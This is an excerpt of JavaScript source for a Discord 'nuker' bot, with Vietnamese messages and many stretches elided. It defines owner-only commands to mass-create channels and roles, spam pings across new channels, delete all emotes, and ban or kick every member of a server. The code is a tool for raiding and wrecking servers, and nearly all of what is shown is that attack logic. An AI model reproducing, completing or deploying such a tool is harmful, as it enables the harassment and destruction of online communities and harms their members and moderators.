...
nuker.on("ready", () => {
    ...
    console.log(red(`                              
                    ...
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "Fucking", type: "PLAYING" });
});
...
nuker.on("messageCreate", (message) => {
    ...
    **mass ban ;**
    ...
    if (!disableEveryone) {
        ...
        // Help
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("Mày ko có quyền");
            message.channel.send({embeds: [help]})
        }
    ...
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            ...
            if (amount > 500) return reject("Error: chỉ tạo được dưới 500 kênh");
            if (!channelPerms) return reject("Không có quyền: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} on top`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
    ...
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            ...
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} on top`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
    ...
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            ...
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (!rolePerms) return reject("Không có quyền: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "toquyen8928 on top", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
    ...
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Không có quyền: 'MANAGE_EMOJIS_AND_STICKERS'");
    ...
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Không có quyền: 'BAN_MEMBERS'");
    ...
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Không có quyền: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
